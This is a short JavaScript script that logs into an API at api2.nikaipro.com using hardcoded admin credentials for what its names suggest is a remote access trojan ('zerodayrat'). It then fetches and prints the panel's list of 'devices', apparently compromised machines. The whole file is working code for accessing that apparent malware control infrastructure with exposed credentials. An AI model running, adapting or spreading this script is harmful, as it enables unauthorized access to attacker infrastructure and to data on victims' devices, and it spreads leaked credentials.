async function listDevices() {
  const loginRes = await fetch('https://api2.nikaipro.com/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'admin@zerodayrat.com', password: 'admin@zerodayRAT' })
  });
  const { token } = await loginRes.json();
  const res = await fetch('https://api2.nikaipro.com/api/devices', {
    headers: { Authorization: `Bearer ${token}` }
  });
  const data = await res.json();
  console.log("Devices:", JSON.stringify(data, null, 2));
}
listDevices().catch(console.error);

